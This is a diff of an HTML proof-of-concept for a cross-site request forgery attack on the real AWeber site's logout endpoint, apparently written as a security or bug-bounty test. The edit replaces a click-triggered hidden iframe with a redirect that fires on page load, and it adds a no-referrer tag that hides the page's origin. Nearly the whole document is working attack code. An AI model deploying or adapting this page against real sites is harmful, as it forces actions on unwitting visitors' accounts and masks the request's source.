@@ -1,23 +1,19 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Logout CSRF Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+    <title>AWeber CSRF Security Test</title>
 </head>
 <body>
-    <h2>Logout CSRF Security Test</h2>
-
-    <button onclick="testLogout()">Test Logout CSRF</button>
-
     <script>
-        function testLogout() {
-            const frame = document.createElement("iframe");
+    "use strict";
 
-            frame.style.display = "none";
-
-            frame.src = "https://www.aweber.com/users/account/logout";
-
-            document.body.appendChild(frame);
-        }
+    (() => {
+        const target = "https://www.aweber.com/users/account/logout";
+        window.location.replace(target);
+    })();
     </script>
 </body>
 </html>
